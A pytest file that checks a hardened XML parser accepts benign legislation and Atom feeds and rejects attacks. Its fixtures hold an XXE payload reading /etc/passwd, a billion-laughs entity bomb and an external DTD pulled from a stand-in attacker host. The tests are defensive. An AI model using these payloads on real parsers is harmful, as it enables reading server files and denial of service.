"""xml_safe.parse_xml — XXE / entity-bomb rejection + benign-content acceptance."""

from __future__ import annotations

import pytest
from lxml import etree

from src.xml_safe import parse_xml


BENIGN_CLML = b"""<?xml version="1.0" encoding="UTF-8"?>
<Legislation xmlns="http://www.legislation.gov.uk/namespaces/legislation">
  <Primary>
    <Act>
      <Number>2024</Number>
      <Year>2024</Year>
    </Act>
  </Primary>
</Legislation>
"""

BENIGN_ATOM = b"""<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <entry>
    <id>http://caselaw.nationalarchives.gov.uk/id/ukpga/2024/1</id>
    <title>Test Act 2024</title>
  </entry>
</feed>
"""

XXE_ATTACK = b"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
"""

BILLION_LAUGHS = b"""<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
"""

EXTERNAL_DTD = b"""<?xml version="1.0"?>
<!DOCTYPE root SYSTEM "http://attacker.example/evil.dtd">
<root>hello</root>
"""


def test_parse_xml_accepts_bytes() -> None:
    root = parse_xml(BENIGN_CLML)
    assert root.tag.endswith("Legislation")


def test_parse_xml_accepts_str() -> None:
    root = parse_xml(BENIGN_CLML.decode("utf-8"))
    assert root.tag.endswith("Legislation")


def test_parse_xml_accepts_atom() -> None:
    root = parse_xml(BENIGN_ATOM)
    assert root.tag.endswith("feed")


def test_parse_xml_rejects_xxe_entity() -> None:
    """XXE: file:// or http:// SYSTEM entity must raise."""
    with pytest.raises(etree.XMLSyntaxError):
        parse_xml(XXE_ATTACK)


def test_parse_xml_rejects_billion_laughs() -> None:
    """Recursive entity bomb must not be allowed to expand."""
    with pytest.raises(etree.XMLSyntaxError):
        parse_xml(BILLION_LAUGHS)


def test_parse_xml_rejects_external_dtd() -> None:
    """External DTD reference must not trigger a network fetch — must raise."""
    with pytest.raises(etree.XMLSyntaxError):
        parse_xml(EXTERNAL_DTD)
